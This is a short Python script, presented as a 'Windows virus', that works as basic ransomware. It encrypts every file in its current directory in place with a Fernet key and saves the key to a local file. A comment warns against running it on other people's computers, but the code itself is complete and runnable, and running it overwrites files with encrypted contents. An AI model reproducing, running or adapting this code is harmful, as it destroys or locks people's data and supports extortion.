# Windows virus with python
# WARNING : THIS CODE IS NOT MEANT TO BE RUN ON HARDWARE THAT YOU DON'T HAVE ACCESS TO SO PLEASE DON'T DO IT ON YOUR FRIENDS COMPUTER, YOU CAN GET SUED FOR IT ! YOU HAVE BEEN WARNED !
# No copyright file.
# Find file to infect

import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
    if file == "windowsvirus.py" or file == "thekey.key":
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)

key = Fernet.generate_key()

with open("thekey.key", "wb") as thekey:
    thekey.write(key)

for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
        contents_encrypted = Fernet(key).encrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(contents_encrypted)